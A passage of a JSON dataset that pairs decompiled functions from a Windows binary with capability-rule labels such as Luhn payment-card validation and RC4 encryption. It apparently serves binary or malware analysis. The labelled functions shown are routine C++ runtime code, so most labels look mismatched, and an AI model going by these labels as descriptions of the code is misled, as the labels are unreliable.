0;\n    arg1[0x14] = *(arg2 + 0xa0);\n    *(arg2 + 0x18) = 0x0;\n    arg1[0x15] = *(arg2 + 0xa8);\n    *(arg2 + 0xa8) = 0;\n    arg1[0x16] = *(arg2 + 0xb0);\n    *(arg2 + 0xb0) = 0;\n    arg1[0x17] = *(arg2 + 0xb8);\n    uVar4 = *(arg2 + 0xc0);\n    *(arg2 + 0xb8) = 0;\n    *(arg2 + 0xc0) = 0;\n    arg1[0x18] = uVar4;\n    *(arg2 + 0x28) = 0x0;\n    *(arg2 + 0x68) = uVar1 & 0xffffffff00000000 | uVar1 >> 0x20;\n    return;\n}\n",
        "token_count": 861
    },
    "1400856c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400856c0(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = 0x14010aa70;\n    fcn.140083c60(arg1);\n    fcn.14007c410(arg1 + 10);\n    *arg1 = *0x140103330 + 0x10;\n    arg1_00 = arg1[7];\n    if (arg1_00 != *0x1400fb720) {\n        if (**0x140102a70 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.14009f4c0(arg1_00);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "14008571": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140085710(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = 0x14010aa70;\n    fcn.140083c60(arg1);\n    fcn.14007c410(arg1 + 10);\n    *arg1 = *0x140103330 + 0x10;\n    arg1_00 = arg1[7];\n    if (arg1_00 != *0x1400fb720) {\n        if (**0x140102a70 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.14009f4c0(arg1_00);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "14008576": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.140085760(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    ulong uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    \n    fcn.140083c60(arg1);\n    fcn.140095d50(arg1, arg2);\n    uVar3 = *(arg1 + 0x50);\n    *(arg1 + 0x50) = *(arg2 + 0x50);\n    *(arg2 + 0x50) = uVar3;\n    uVar2 = *(arg1 + 0x58);\n    *(arg1 + 0x58) = *(arg2 + 0x58);\n    uVar4 = *(arg2 + 0x60);\n    uVar5 = *(arg2 + 100);\n    uVar6 = *(arg2 + 0x68);\n    uVar7 = *(arg2 + 0x6c);\n    *(arg2 + 0x58) = uVar2;\n    *(arg2 + 0x60) = 0;\n    uVar1 = *(arg2 + 0x60);\n    *(arg1 + 0x60) = uVar4;\n    *(arg1 + 100) = uVar5;\n    *(arg1 + 0x68) = uVar6;\n    *(arg1 + 0x6c) = uVar7;\n    uVar3 = *(arg2 + 0x70);\n    *(arg2 + 0x70) = 0;\n    *(arg1 + 0x70) = uVar3;\n    uVar3 = *(arg2 + 0x78);\n    *(arg2 + 0x78) = 1;\n    *(arg1 + 0x78) = uVar3;\n    uVar2 = *(arg2 + 0x80);\n    *(arg2 + 0x80) = 0;\n    *(arg1 + 0x80) = uVar2;\n    uVar3 = *(arg2 + 0xa8);\n    *(arg2 + 0xa8) = 0;\n    *(arg1 + 0xa8) = uVar3;\n    uVar3 = *(arg2 + 0xb0);\n    *(arg2 + 0xb0) = 0;\n    *(arg1 + 0xb0) = uVar3;\n    uVar3 = *(arg2 + 0xb8);\n    *(arg2 + 0xb8) = 0;\n    *(arg1 + 0xb8) = uVar3;\n    uVar3 = *(arg2 + 0xc0);\n    *(arg2 + 0xc0) = 0;\n    *(arg1 + 0xc0) = uVar3;\n    uVar2 = *(arg2 + 0x81);\n    *(arg2 + 0x81) = 0;\n    *(arg1 + 0x81) = uVar2;\n    uVar2 = *(arg2 + 0x82);\n    *(arg2 + 0x82) = 0;\n    *(arg1 + 0x82) = uVar2;\n    uVar3 = *(arg2 + 0x88);\n    *(arg2 + 0x88) = 0;\n    *(arg1 + 0x88) = uVar3;\n    uVar3 = *(arg2 + 0x90);\n    *(arg2 + 0x90) = 0;\n    *(arg1 + 0x90) = uVar3;\n    uVar2 = *(arg2 + 0x98);\n    *(arg2 + 0x98) = 0;\n    *(arg1 + 0x98) = uVar2;\n    uVar3 = *(arg2 + 0x70);\n    *(arg2 + 0x30) = 0;\n    *(arg2 + 0x18) = uVar3;\n    *(arg2 + 0x68) = uVar1 & 0xffffffff00000000 | uVar1 >> 0x20;\n    *(arg2 + 8) = uVar3;\n    *(arg2 + 0x10) = uVar3;\n    *(arg2 + 0x20) = 0x0;\n    return arg1;\n}\n",
        "token_count": 973
    },
    "14008596": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140085960(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = (**(**(arg1 + 0xa0) + 0x30))();\n    if (cVar1 != '\\0') {\n        return *(arg1 + 0x10) - *(arg1 + 0x18) >> 1;\n    }\n    iVar2 = (**(**(arg1 + 0xa0) + 0x38))\n                      (*(arg1 + 0xa0), arg2, *(arg1 + 0xa8), *(arg1 + 0xb8), *(arg1 + 0x10) - *(arg1 + 8) >> 1);\n    return (iVar2 + *(arg1 + 0xa8)) - *(arg1 + 0xc0);\n}\n",
        "token_count": 195
    },
    "14008699": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.140086990(int64_t *arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint in_stack_00000028;\n    \n    *arg1 = -1;\n    *(arg1 + 1) = 0;\n    cVar2 = fcn.140085a70(arg2);\n    if (cVar2 != '\\0') {\n        iVar3 = fcn.14007c180(arg2 + 0x50, arg3, arg4);\n        if (iVar3 != -1) {\n            uVar1 = *(arg2 + 0xa8);\n            *arg1 = iVar3;\n            *(arg2 + 0x81) = 0;\n            *(arg2 + 0x30) = 0;\n            *(arg2 + 0xb8) = uVar1;\n            *(arg2 + 0xc0) = uVar1;\n            uVar1 = *(arg2 + 0x70);\n            *(arg2 + 0x68) = in_stack_00000028;\n            *(arg2 + 0x18) = uVar1;\n            *(arg1 + 1) = in_stack_00000028;\n            *(arg2 + 8) = uVar1;\n            *(arg2 + 0x10) = uVar1;\n            *(arg2 + 0x20) = 0x0;\n            return arg1;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 345
    },
    "14008775": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.140087750(char **arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    ushort uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    \n    fcn.1400966b0(arg1, arg2);\n    *(arg1 + 8) = 0;\n    pcVar3 = *(arg2 + 0x70);\n    *arg1 = \"P}\\b@\\x01\";\n    pcVar4 = *(arg2 + 0x50);\n    arg1[9] = NULL;\n    arg1[10] = pcVar4;\n    *(arg2 + 0x50) = 0;\n    *(arg1 + 0xb) = *(arg2 + 0x58);\n    *(arg2 + 0x58) = 0;\n    uVar5 = *(arg2 + 0x60);\n    uVar6 = *(arg2 + 100);\n    uVar7 = *(arg2 + 0x68);\n    uVar8 = *(arg2 + 0x6c);\n    arg1[0xf] = *(arg2 + 0x78);\n    uVar2 = *(arg2 + 0x80);\n    arg1[0xe] = pcVar3;\n    *(arg1 + 0x10) = uVar2;\n    *(arg2 + 0x60) = 0;\n    uVar1 = *(arg2 + 0x60);\n    *(arg1 + 0x82) = *(arg2 + 0x82);\n    uVar2 = *(arg2 + 0x84);\n    *(arg1 + 0xc) = uVar5;\n    *(arg1 + 100) = uVar6;\n    *(arg1 + 0xd) = uVar7;\n    *(arg1 + 0x6c) = uVar8;\n    *(arg1 + 0x84) = uVar2;\n    *(arg2 + 0x70) = 0;\n    arg1[0x11] = *(arg2 + 0x88);\n    pcVar3 = *(arg2 + 0x90);\n    *(arg2 + 0x78) = 1;\n    *(arg2 + 0x80) = 0;\n    *(arg2 + 0x82) = 0;\n    *(arg2 + 0x88) = 0;\n    *(arg2 + 0x90) = 0;\n    arg1[0x12] = pcVar3;\n    *(arg2 + 8) = 0x0;\n    *(arg1 + 0x13) = *(arg2 + 0x98);\n    *(arg2 + 0x98) = 0;\n    arg1[0x14] = *(arg2 + 0xa0);\n    *(arg2 + 0x18) = 0x0;\n    arg1[0x15] = *(arg2 + 0xa8);\n    *(arg2 + 0xa8) = 0;\n    arg1[0x16] = *(arg2 + 0xb0);\n    *(arg2 + 0xb0) = 0;\n    arg1[0x17] = *(arg2 + 0xb8);\n    pcVar3 = *(arg2 + 0xc0);\n    *(arg2 + 0xb8) = 0;\n    *(arg2 + 0xc0) = 0;\n    arg1[0x18] = pcVar3;\n    *(arg2 + 0x28) = 0x0;\n    *(arg2 + 0x68) = uVar1 & 0xffffffff00000000 | uVar1 >> 0x20;\n    return;\n}\n",
        "token_count": 854
    },
    "140087d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140087d50(char **arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = \"P}\\b@\\x01\";\n    fcn.140086280(arg1);\n    fcn.14007c410(arg1 + 10);\n    *arg1 = *0x140103340 + 0x10;\n    arg1_00 = arg1[7];\n    if (arg1_00 != *0x1400fb720) {\n        if (**0x140102a70 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.14009f4c0(arg1_00);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "140087da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140087da0(char **arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = \"P}\\b@\\x01\";\n    fcn.140086280(arg1);\n    fcn.14007c410(arg1 + 10);\n    *arg1 = *0x140103340 + 0x10;\n    arg1_00 = arg1[7];\n    if (arg1_00 != *0x1400fb720) {\n        if (**0x140102a70 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.14009f4c0(arg1_00);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "140087df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.140087df0(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    ulong uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    \n    fcn.140086280(arg1);\n    fcn.1400967c0(arg1, arg2);\n    uVar3 = *(arg1 + 0x50);\n    *(arg1 + 0x50) = *(arg2 + 0x50);\n    *(arg2 + 0x50) = uVar3;\n    uVar2 = *(arg1 + 0x58);\n    *(arg1 + 0x58) = *(arg2 + 0x58);\n    uVar4 = *(arg2 + 0x60);\n    uVar5 = *(arg2 + 100);\n    uVar6 = *(arg2 + 0x68);\n    uVar7 = *(arg2 + 0x6c);\n    *(arg2 + 0x58) = uVar2;\n    *(arg2 + 0x60) = 0;\n    uVar1 = *(arg2 + 0x60);\n    *(arg1 + 0x60) = uVar4;\n    *(arg1 + 100) = uVar5;\n    *(arg1 + 0x68) = uVar6;\n    *(arg1 + 0x6c) = uVar7;\n    uVar3 = *(arg2 + 0x70);\n    *(arg2 + 0x70) = 0;\n    *(arg1 + 0x70) = uVar3;\n    uVar3 = *(arg2 + 0x78);\n    *(arg2 + 0x78) = 1;\n    *(arg1 + 0x78) = uVar3;\n    uVar2 = *(arg2 + 0x80);\n    *(arg2 + 0x80) = 0;\n    *(arg1 + 0x80) = uVar2;\n    uVar3 = *(arg2 + 0xa8);\n    *(arg2 + 0xa8) = 0;\n    *(arg1 + 0xa8) = uVar3;\n    uVar3 = *(arg2 + 0xb0);\n    *(arg2 + 0xb0) = 0;\n    *(arg1 + 0xb0) = uVar3;\n    uVar3 = *(arg2 + 0xb8);\n    *(arg2 + 0xb8) = 0;\n    *(arg1 + 0xb8) = uVar3;\n    uVar3 = *(arg2 + 0xc0);\n    *(arg2 + 0xc0) = 0;\n    *(arg1 + 0xc0) = uVar3;\n    uVar2 = *(arg2 + 0x81);\n    *(arg2 + 0x81) = 0;\n    *(arg1 + 0x81) = uVar2;\n    uVar2 = *(arg2 + 0x82);\n    *(arg2 + 0x82) = 0;\n    *(arg1 + 0x82) = uVar2;\n    uVar3 = *(arg2 + 0x88);\n    *(arg2 + 0x88) = 0;\n    *(arg1 + 0x88) = uVar3;\n    uVar3 = *(arg2 + 0x90);\n    *(arg2 + 0x90) = 0;\n    *(arg1 + 0x90) = uVar3;\n    uVar2 = *(arg2 + 0x98);\n    *(arg2 + 0x98) = 0;\n    *(arg1 + 0x98) = uVar2;\n    uVar3 = *(arg2 + 0x70);\n    *(arg2 + 0x30) = 0;\n    *(arg2 + 0x18) = uVar3;\n    *(arg2 + 0x68) = uVar1 & 0xffffffff00000000 | uVar1 >> 0x20;\n    *(arg2 + 8) = uVar3;\n    *(arg2 + 0x10) = uVar3;\n    *(arg2 + 0x20) = 0x0;\n    return arg1;\n}\n",
        "token_count": 974
    },
    "1400af1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400af1f0(int64_t arg1, int64_t arg2)\n\n{\n    fcn.1400ad200(arg1);\n    fcn.1400af0e0(arg1, arg1 + 0xd0);\n    *(arg1 + 0xe2) = 0;\n    *(arg1 + 0xe0) = 0;\n    *(arg1 + 0x1c) = 0;\n    *(arg1 + 0xd8) = 0;\n    *(arg1 + 0xe8) = arg2;\n    *(arg1 + 0x20) = arg2 == 0;\n    return;\n}\n",
        "token_count": 148
    },
    "14008fb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014008fbcf)\n// WARNING: Removing unreachable block (ram,0x00014008fc93)\n// WARNING: Removing unreachable block (ram,0x00014008fc15)\n// WARNING: Removing unreachable block (ram,0x00014008fbc0)\n// WARNING: Removing unreachable block (ram,0x00014008fc30)\n// WARNING: Removing unreachable block (ram,0x00014008fba3)\n\nvoid fcn.14008fb40(ulong *arg1, uint64_t arg2)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    char *arg1_00;\n    uint64_t *puVar5;\n    uint32_t uVar6;\n    ulong *unaff_RBX;\n    uint64_t arg1_01;\n    uchar *unaff_RSI;\n    ulong unaff_RDI;\n    \ncode_r0x00014008fb40:\n    *(*0x20 + -8) = unaff_RSI;\n    *(*0x20 + -0x10) = unaff_RBX;\n    *arg1 = 0;\n    arg1[1] = 0;\n    *(arg1 + 2) = 0xffffffff;\n    *(*0x20 + -0x40) = 0x14008fb71;\n    iVar3 = fcn.140029e10(arg2, \"default\");\n    if (iVar3 != 0) {\n        *(*0x20 + -0x40) = 0x14008fb9f;\n        iVar3 = fcn.140029e10(arg2, \"rdseed\");\n        arg1_01 = arg2;\n        if (iVar3 != 0) goto code_r0x00014008fc00;\n        piVar1 = cpuid_basic_info(0);\n        uVar6 = piVar1[1];\n        arg1_01 = uVar6;\n        if ((*piVar1 != 0) && ((uVar6 == 0x756e6547 || (uVar6 == 0x68747541)))) {\n            iVar2 = cpuid_Extended_Feature_Enumeration_info(7);\n            uVar6 = *(iVar2 + 4) & 0x40000;\n            arg1_01 = uVar6;\n            if (uVar6 != 0) {\ncode_r0x00014008fbca:\n                iVar2 = cpuid_Version_info(1);\n                uVar4 = 0x14007b480;\n                if ((*(iVar2 + 0xc) & 0x40000000) == 0) {\n                    uVar4 = 0x14007b250;\n                }\n                goto code_r0x00014008fb7c;\n            }\n        }\ncode_r0x00014008fbf0:\n        *(*0x20 + -0x40) = 0x14008fbfc;\n        fcn.1400b7210(\"random_device::random_device(const std::string&): device not available\");\ncode_r0x00014008fc00:\n        *(*0x20 + -0x40) = 0x14008fc0f;\n        iVar3 = fcn.140029e10(arg1_01, \"rdrand\");\n        if (iVar3 != 0) {\n            *(*0x20 + -0x40) = 0x14008fc5f;\n            iVar3 = fcn.140029e10(arg1_01, \"rdrnd\");\n            if (iVar3 != 0) {\n                *(*0x20 + -0x40) = 0x14008fc72;\n                iVar3 = fcn.140029e10(arg1_01, 0x1400fe7a3);\n                if (iVar3 != 0) {\n                    *(*0x20 + -0x40) = 0x14008fcbf;\n                    iVar3 = fcn.140029e10(arg1_01, \"hardware\");\n                    if (iVar3 != 0) goto code_r0x00014008fcc3;\n                }\n                if (iVar3 == 0) {\n                    piVar1 = cpuid_basic_info(0);\n                }\n                else if (iVar3 == 1) {\n                    piVar1 = cpuid_Version_info(1);\n                }\n                else if (iVar3 == 2) {\n                    piVar1 = cpuid_cache_tlb_info(2);\n                }\n                else if (iVar3 == 3) {\n                    piVar1 = cpuid_serial_info(3);\n                }\n                else if (iVar3 == 4) {\n                    piVar1 = cpuid_Deterministic_Cache_Parameters_info(4);\n                }\n                else if (iVar3 == 5) {\n                    piVar1 = cpuid_MONITOR_MWAIT_Features_info(5);\n                }\n                else if (iVar3 == 6) {\n                    piVar1 = cpuid_Thermal_Power_Management_info(6);\n                }\n                else if (iVar3 == 7) {\n                    piVar1 = cpuid_Extended_Feature_Enumeration_info(7);\n                }\n                else if (iVar3 == 9) {\n                    piVar1 = cpuid_Direct_Cache_Access_info(9);\n                }\n                else if (iVar3 == 10) {\n                    piVar1 = cpuid_Architectural_Performance_Monitoring_info(10);\n                }\n                else if (iVar3 == 0xb) {\n                    piVar1 = cpuid_Extended_Topology_info(0xb);\n                }\n                else if (iVar3 == 0xd) {\n                    piVar1 = cpuid_Processor_Extended_States_info(0xd);\n                }\n                else if (iVar3 == 0xf) {\n                    piVar1 = cpuid_Quality_of_Service_info(0xf);\n                }\n                else if (iVar3 == -0x7ffffffe) {\n                    piVar1 = cpuid_brand_part1_info(0x80000002);\n                }\n                else if (iVar3 == -0x7ffffffd) {\n                    piVar1 = cpuid_brand_part2_info(0x80000003);\n                }\n                else if (iVar3 == -0x7ffffffc) {\n                    piVar1 = cpuid_brand_part3_info(0x80000004);\n                }\n                else {\n                    piVar1 = cpuid(iVar3);\n                }\n                if ((*piVar1 != 0) &&\n                   (((piVar1[1] == 0x756e6547 || (piVar1[1] == 0x68747541)) &&\n                    (iVar2 = cpuid_Extended_Feature_Enumeration_info(7),  (*(iVar2 + 4) & 0x40000) != 0))))\n                goto code_r0x00014008fbca;\n            }\n        }\n        piVar1 = cpuid_basic_info(0);\n        uVar6 = piVar1[1];\n        arg1_01 = uVar6;\n        if ((*piVar1 != 0) && ((uVar6 == 0x756e6547 || (uVar6 == 0x68747541)))) {\n            iVar2 = cpuid_Version_info(1);\n            arg1_01 = *(iVar2 + 4);\n            if ((*(iVar2 + 0xc) & 0x40000000) != 0) {\n                arg1[1] = fcn.14007b200;\n                return;\n            }\n        }\n        goto code_r0x00014008fbf0;\n    }\n    goto code_r0x00014008fb75;\ncode_r0x00014008fcc3:\n    puVar5 = 0x1400fe7af;\n    *(*0x20 + -0x40) = 0x14008fcd2;\n    iVar3 = fcn.140029e10(arg1_01, 0x1400fe7af);\n    if (iVar3 == 0) {\ncode_r0x00014008fb75:\n        uVar4 = 0x14007b310;\ncode_r0x00014008fb7c:\n        arg1[1] = uVar4;\n        return;\n    }\n    arg1_00 = \"random_device::random_device(const std::string&): unsupported token\";\n    *(*0x20 + -0x40) = 0x14008fce6;\n    fcn.1400b7210(\"random_device::random_device(const std::string&): unsupported token\");\n    arg2 = *puVar5;\n    iVar2 = *(arg2 - 0x18);\n    *(*0x20 + -0x40) = unaff_RDI;\n    *(*0x20 + -0x48) = arg1;\n    *(*0x20 + -0x50) = arg1_01;\n    unaff_RSI = *0x20 + -0x60;\n    *(*0x20 + -0x70) = unaff_RSI;\n    if ((arg2 != 0) || (iVar2 == 0)) {\n        *(*0x20 + -0x98) = 0x14008faee;\n        fcn.1400a1350(*0x20 + -0x70, arg2, iVar2 + arg2);\n        *(*0x20 + -0x98) = 0x14008faf9;\n        fcn.14008fb40(arg1_00, *0x20 + -0x70);\n        if (*(*0x20 + -0x70) != unaff_RSI) {\n            *(*0x20 + -0x98) = 0x14008fb08;\n            fcn.1400b64d0();\n        }\n        return;\n    }\n    *(*0x20 + -0x98) = 0x14008fb1d;\n    unaff_RBX = fcn.1400b7080(0x1400fe850);\n    if (*(*0x20 + -0x70) != unaff_RSI) {\n        *(*0x20 + -0x98) = 0x14008fb2f;\n        fcn.1400b64d0();\n    }\n    *(*0x20 + -0x98) = 0x14008fb37;\n    arg1 = unaff_RBX;\n    fcn.14000f000(unaff_RBX);\n    *0x20 = *0x20 + -0x90;\n    goto code_r0x00014008fb40;\n}\n",
        "token_count": 2301
    },
    "14008fdf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14008fdf0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x1401032f0 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.140075be0(arg2, iVar1);\n    arg1[1] = iVar1;\n    return;\n}\n",
        "token_count": 123
    },
    "14008fe5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14008fe50(int64_t *arg1, ulong *arg2)\n\n{\n    ulong arg3;\n    \n    arg3 = arg2[1];\n    *arg1 = *0x1401032f0 + 0x10;\n    fcn.14007c480(arg1 + 1, *arg2, arg3);\n    return;\n}\n",
        "token_count": 81
    },
    "1400abce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400abce0(int64_t *arg1)\n\n{\n    *arg1 = 0x14010c040;\n    fcn.14009f7a0(arg1 + 2);\n    *arg1 = *0x140103430 + 0x10;\n    return;\n}\n",
        "token_count": 68
    },
    "1400abe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400abe40(int64_t *arg1)\n\n{\n    *arg1 = 0x14010c0a0;\n    fcn.14009f7a0(arg1 + 2);\n    *arg1 = *0x140103440 + 0x10;\n    return;\n}\n",
        "token_count": 69
    },
    "14009512": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140095120(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x1401032f0 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.140075be0(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140103320 + 0x10;\n    return;\n}\n",
        "token_count": 139
    },
    "14009567": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140095670(int64_t *arg1)\n\n{\n    if (arg1[2] < arg1[3]) {\n        arg1[2] = arg1[2] + 1;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00014009568b. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(*arg1 + 0x50))();\n    return;\n}\n",
        "token_count": 103
    },
    "14009fa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009fa10(int32_t **arg1, int32_t **arg2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    \n    piVar1 = *arg2;\n    bVar2 = piVar1 != *0x1400fb720;\n    *arg1 = piVar1;\n    if (bVar2) {\n        if (**0x140102a70 != 0) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            return;\n        }\n        *piVar1 = *piVar1 + 1;\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "140095c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140095c40(ulong *arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    \n    *arg1 = 0x14010b070;\n    arg1[1] = *(arg2 + 8);\n    arg1[2] = *(arg2 + 0x10);\n    arg1[3] = *(arg2 + 0x18);\n    arg1[4] = *(arg2 + 0x20);\n    arg1[5] = *(arg2 + 0x28);\n    arg1[6] = *(arg2 + 0x30);\n    piVar1 = *(arg2 + 0x38);\n    bVar2 = piVar1 != *0x1400fb720;\n    arg1[7] = piVar1;\n    if (bVar2) {\n        if (**0x140102a70 != 0) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            return;\n        }\n        *piVar1 = *piVar1 + 1;\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "140095d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
